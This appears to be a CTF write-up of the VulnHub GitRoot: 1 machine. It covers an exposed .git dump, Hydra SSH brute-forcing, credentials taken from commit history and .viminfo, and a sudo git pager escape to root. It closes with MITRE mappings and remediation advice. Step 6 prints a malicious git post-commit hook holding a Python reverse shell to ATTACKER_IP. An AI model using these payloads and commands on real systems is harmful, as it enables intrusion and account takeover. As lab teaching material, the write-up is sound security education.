# GitRoot: 1 — When the Version History Comes Back to Haunt You

Git is the backbone of modern software development. But when `.git/` directories get accidentally exposed on production web servers, the entire version history becomes a gift to any attacker with `wget`. GitRoot: 1 leans hard into this reality: every step of the attack chain flows through git — exposed repo, commit history leaking credentials, and finally a git hook delivering RCE. The privesc? A NOPASSWD sudo git that opens a pager escape straight to root. Legit one of the most "themed" machines on VulnHub, and it's bussin with real-world relevance. fr fr.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | GitRoot: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/gitroot-1,627/ |
| **Techniques** | vhost enumeration, exposed .git recovery, credential recovery from deleted files, Hydra SSH brute-force, git commit log analysis, git hook RCE, sudo GTFOBin (git pager) |
| **CVEs** | CWE-538 (File/Directory Info Exposure), CWE-522 (Inadequately Protected Credentials), CWE-269 (Improper Privilege Management) |
| **APT Groups** | APT28 (Fancy Bear) — exfiltrates source code repos to harvest hardcoded secrets; FIN7 — uses developer artifact theft to pivot through environments |

---

## Attack Summary

```
nmap → WordPress on wp.gitroot.vuln
  → gobuster vhost → repo.gitroot.vuln
  → exposed /.git/ directory
  → GitTools dumper + extractor
  → deleted set.php recovered → credentials (don't work for SSH)
  → Hydra brute-force SSH → pablo:PASSWORD
  → pablo shell → public/ git repo belonging to beth
  → git log --all → commit diff reveals beth's password
  → beth shell → jen message: "drop a zip I'll extract it"
  → malicious .git/hooks/post-commit in zip → jen extracts → RCE
  → jen shell → cat ~/.viminfo → jen's password
  → su jen → sudo git -p help config → !/bin/sh → root
```

---

## Methodology

1. Network scan and virtual host enumeration to map the attack surface
2. Exposed `.git/` directory dumped and reconstructed locally
3. Deleted PHP credential file recovered from git object store
4. Hydra brute-force on SSH using recovered username
5. Lateral movement pablo → beth via git commit history leak
6. Lateral movement beth → jen via malicious git hook inside zip
7. Credential recovery from `.viminfo` file
8. Root via GTFOBins sudo git pager escape

---

## Step 1 — Network Discovery and vHost Mapping

The machine's IP redirects HTTP traffic to a virtual hostname — a common trick to frustrate directory brute-force against bare IPs.

```bash
sudo netdiscover -r 192.168.10.0/24
nmap -A -p- 192.168.10.162
```

Port 80 redirects to `wp.gitroot.vuln`. Add it to `/etc/hosts`:

```
192.168.10.162  wp.gitroot.vuln
```

**What is vhost enumeration?** Web servers often host multiple sites on one IP via the HTTP `Host:` header. Gobuster's vhost mode fuzz the header to discover hidden sites:

```bash
gobuster vhost \
  -u http://192.168.10.162 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 40
# Found: repo.gitroot.vuln
```

Update `/etc/hosts`:
```
192.168.10.162  wp.gitroot.vuln repo.gitroot.vuln
```

**Alternatively:** `ffuf -w wordlist.txt -H "Host: FUZZ.gitroot.vuln" -u http://192.168.10.162` — same result, faster.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1190 — Exploit Public-Facing Application (virtual host enumeration as initial surface mapping)

---

## Step 2 — Dump the Exposed .git Directory

`repo.gitroot.vuln` runs a code hosting page with `/.git/` publicly accessible. This is one of the most common misconfigurations in development environments promoted to production.

**What is `.git/` exposure?** Git stores the entire repository history — including deleted files, old commits, and credentials — in the `.git/` directory. Tools like GitTools reconstruct the full repo from HTTP-accessible object files.

```bash
# Install GitTools if needed
git clone https://github.com/internetwache/GitTools /opt/GitTools

# Dump all .git objects
/opt/GitTools/Dumper/gitdumper.sh \
  http://repo.gitroot.vuln/.git/ \
  /tmp/gitroot/git-tmp/

# Reconstruct source files including deleted ones
/opt/GitTools/Extractor/extractor.sh \
  /tmp/gitroot/git-tmp/ \
  /tmp/gitroot/extracted/
```

**Alternatively:** `git-dumper` (pip install git-dumper) is a single-tool approach with better error handling.

**Real-world note:** In 2023, multiple organizations using GitLab self-hosted instances exposed `.git/` directories via misconfigured Nginx reverse proxies. The Cybersecurity & Infrastructure Security Agency issued guidance specifically on this class of exposure. CWE-538 covers this pattern.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — Recover Deleted Credentials

The extractor reconstructs all commits, including files deleted from HEAD. One of the recovered files is `set.php`:

```bash
find /tmp/gitroot/extracted -name "*.php" | xargs grep -l "pass\|cred\|user" 2>/dev/null
cat /tmp/gitroot/extracted/*/set.php
```

The file contains database-style credentials. Unfortunately they don't work directly for SSH — bruh. But they confirm a username: **pablo**.

**Rabbit hole note:** It's tempting to try these creds everywhere first. They work neither for SSH nor for WordPress. The useful piece is the username.

**MITRE ATT&CK:** T1552.001 — Credentials in Files (deleted file recovery from VCS history)

---

## Step 4 — Hydra SSH Brute-Force (pablo)

With a confirmed username, brute-forcing SSH is the logical next step:

```bash
hydra -l pablo \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.10.162 \
  -t 4 -V -f
```

The `-f` flag stops on first success, and `-t 4` keeps threads low to avoid SSH rate-limiting.

```bash
ssh pablo@192.168.10.162
cat user.txt
```

**Alternatively:** Medusa: `medusa -h 192.168.10.162 -u pablo -P rockyou.txt -M ssh -t 4`

**Real-world note:** SSH brute-force is a constant in the wild. Shodan indexes millions of SSH services. APT28 (Fancy Bear) — the Russian GRU-linked threat group — extensively used credential stuffing and SSH brute-force in operations against Ukrainian infrastructure. Fail2ban + key-only auth blocks this entirely.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 5 — Lateral Movement: pablo → beth via Git Commit History

gg, pablo's shell is in. But pablo isn't root. Time to look around:

```bash
ls -la ~/
ls -la ~/public/
```

Pablo's home contains a `public/` directory that is actually a git repository for another user's project. Inspect the commit history:

```bash
cd ~/public
git log --all --oneline
# Look for commits with diff sizes that suggest credential additions
git show <commit-hash>
```

In the diff of a commit labeled something like "add some stuff," beth's password appears as a plaintext value in a script. This is the classic "I'll just put the password here and delete it later" mistake — except git never forgets.

```bash
su beth
# use the recovered password
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files (VCS history); T1021.004 — Remote Services: SSH (lateral movement via su)

---

## Step 6 — Lateral Movement: beth → jen via Git Hook RCE

( ͡° ͜ʖ ͡°) This is the clever part. In beth's environment there's a message from jen: she'll extract any zip dropped in a specific folder. Jen's extraction process includes processing git repos — which means `post-commit` hooks will fire.

**What is a git post-commit hook?** Git hooks are scripts that run automatically at specific points in the git workflow. A `post-commit` hook executes every time a commit is made. If jen's automated zip handler extracts an archive containing a `.git/hooks/post-commit` script and then runs `git commit`, the hook fires as jen.

```bash
# Build the malicious zip
mkdir -p /tmp/payload/.git/hooks

cat > /tmp/payload/.git/hooks/post-commit << 'EOF'
#!/bin/bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",9999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
EOF
chmod +x /tmp/payload/.git/hooks/post-commit

# Stage a commit so the hook is ready to fire
cd /tmp/payload
git init
git config user.email "x@x.com"
git config user.name "x"
touch trigger
git add .
git commit -m "initial"

# Package it
cd /tmp
7z a payload.zip payload/
cp payload.zip /path/to/jen/incoming/
```

Start the listener:
```bash
nc -lvp 9999
```

When jen's cron/process extracts the zip and touches the repo, the shell fires. noice.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1053.003 — Scheduled Task/Job: Cron (jen's automated extraction)

---

## Step 7 — Credential Recovery from .viminfo

`.viminfo` stores Vim's command history, including lines typed during file editing. Passwords entered while editing config files frequently show up here:

```bash
cat ~/.viminfo
# Look for lines starting with "> /path/to/config" then command history below
# jen's password will appear in the history of commands run during a vim session
```

**MITRE ATT&CK:** T1552.003 — Credentials in Bash History (analogous pattern: artifact-stored credentials); T1083 — File and Directory Discovery

---

## Step 8 — Privilege Escalation: sudo git Pager Escape (Root)

Log in as jen and check sudo rights:

```bash
su jen
sudo -l
# (root) NOPASSWD: /usr/bin/git
```

**What is the git pager escape?** When git subcommands produce paginated output, git invokes `less` (or the configured pager). Inside `less`, the `!` command executes a shell command. Since git is running as root, the spawned shell inherits root privileges — a classic GTFOBins technique.

```bash
sudo git -p help config
# Wait for pager to open, then type:
!/bin/sh
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. That's the run.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Username | pablo | set.php (deleted, recovered via git) | Hydra brute → pablo:PASSWORD |
| Credential | beth password | git commit diff in pablo's public/ repo | su beth |
| Credential | jen password | jen's ~/.viminfo history | su jen |
| User flag | user.txt | /home/pablo/user.txt | read |
| Root flag | root.txt | /root/root.txt | sudo git pager |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Exposed `.git/` on `repo.gitroot.vuln` | Production deployments built from git repos frequently include `.git/` if the deploy process copies the working directory verbatim | Block `/.git/` at the web server layer; deploy artifacts, not source trees |
| 2 | Credentials committed then deleted still exist in history | Every leak reported in the GitHub Secret Scanning program follows this pattern: dev pushes creds, deletes them, thinks they're gone | Use `git filter-branch` or BFG Repo-Cleaner to scrub history; rotate all affected credentials |
| 3 | Zip extraction without sandboxing ran arbitrary git hooks | Any service that extracts user-supplied archives and processes their contents is an RCE candidate | Validate archive contents before extraction; run extraction in isolated containers; never process git hooks from untrusted repos |
| 4 | `sudo git` NOPASSWD grants root via pager | GTFOBins documents 10+ git privilege escalation vectors. Many organizations grant broad sudo to developers "for convenience" | Apply the principle of least privilege; audit sudoers regularly; use `NOEXEC` or restrict to specific safe subcommands |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Event Triggered Execution: Unix Shell Hook | T1546.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Block `.git/` access at the web server layer** — Nginx: `location ~ /\.git { deny all; }` Apache: `<DirectoryMatch "\.git"> Require all denied </DirectoryMatch>`
2. **Deploy artifacts, not source trees** — use CI/CD pipelines that build and copy only production files, never the `.git/` directory
3. **Rotate all credentials found in git history** — use `git filter-repo` (preferred over deprecated `filter-branch`) or BFG Repo-Cleaner; treat the remote history as compromised
4. **Pre-commit hooks for secret detection** — integrate `trufflehog`, `gitleaks`, or GitHub's push protection to reject commits containing secrets before they land
5. **Sanitize zip extraction** — run extraction in containers (gVisor, Firejail); validate archive structure; explicitly ignore `.git/` directories: `unzip -d /dest -x "*.git*" archive.zip`
6. **Restrict sudo to safe subcommands** — if git must be in sudoers, use: `(root) NOPASSWD: /usr/bin/git diff` rather than unrestricted `/usr/bin/git`

### If You Find This in Your Environment

- Immediately rotate all credentials visible in any exposed git history
- Check web server logs for access to `/.git/objects/` or `/.git/refs/` paths — those indicate active exfiltration
- Audit sudoers for version-control binaries (git, svn, hg) and remove or restrict

### MITRE D3FEND Countermeasures

- **D3-NTF** — Network Traffic Filtering (block external access to `.git/` paths)
- **D3-OSM** — Operating System Monitoring (alert on unexpected `git commit` events in service accounts)
- **D3-SCA** — Software Component Analysis (detect git repositories deployed to web roots)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit all web-accessible directories for `.git/` exposure |
| Protect | Access Control | Enforce web server deny rules for `.git/`; implement least-privilege sudoers |
| Protect | Data Security | Pre-commit secret scanning; credential rotation policy |
| Detect | Anomalies and Events | Alert on HTTP access to `/.git/objects/` |
| Respond | Response Planning | Revoke and rotate credentials immediately on exposure |
| Recover | Recovery Planning | Use `git filter-repo` to purge secrets from history |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Web server access controls blocking `.git/` |
| AC-6 | Least Privilege | sudo restricted to specific, safe commands |
| IA-5 | Authenticator Management | Credential rotation policy for git-exposed secrets |
| CM-7 | Least Functionality | Disable unnecessary services; deploy minimal web roots |
| SI-7 | Software, Firmware, and Information Integrity | Pre-commit hooks + repo scanning for secrets |
| AU-12 | Audit Record Generation | Log HTTP requests to sensitive paths |

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

---

## Final Thoughts

Big props to the creator of GitRoot: 1 — the machine is beautifully themed. Every single attack step uses git as either the vulnerability, the pivot, or the exploit path. From the exposed repo to the hook-based lateral movement to the pager GTFOBin, it's a masterclass in how a single tool, misconfigured at multiple layers, becomes a complete attack chain.

For anyone starting out: this machine is a goldmine for understanding why DevSecOps practices like pre-commit scanning, artifact-only deployments, and sudoers auditing matter. These aren't hypothetical — they're the exact controls that would have stopped every step of this kill chain.

Keep hacking, keep learning. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
